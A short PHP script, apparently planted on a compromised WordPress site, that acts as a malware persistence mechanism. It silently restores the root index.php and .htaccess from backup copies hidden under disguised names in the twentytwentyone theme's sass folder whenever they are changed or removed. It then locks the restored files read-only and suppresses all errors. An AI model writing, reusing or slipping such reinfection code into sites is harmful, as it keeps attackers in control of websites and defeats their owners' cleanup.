<?php
    $index = $_SERVER['DOCUMENT_ROOT'] . '/index.php';
    $ht = $_SERVER['DOCUMENT_ROOT'] . '/.htaccess';
    $bkindexs = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/themes/twentytwentyone/assets/sass/05-blocks/latest-posts/include/index.log';
    $bkht = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/themes/twentytwentyone/assets/sass/05-blocks/latest-posts/include/htaccess.ed';
    if (!file_exists($index) || (filesize($index) != filesize($bkindexs))) {
        @chmod($index, 0644);
        @unlink($index);
        @file_put_contents($index, file_get_contents($bkindexs));
        @chmod($index, 0444);
    }
    if (!file_exists($ht) || (filesize($ht) != filesize($bkht))) {
        @chmod($ht, 0644);
        @unlink($ht);
        @file_put_contents($ht, file_get_contents($bkht));
        @chmod($ht, 0444);
    }
?>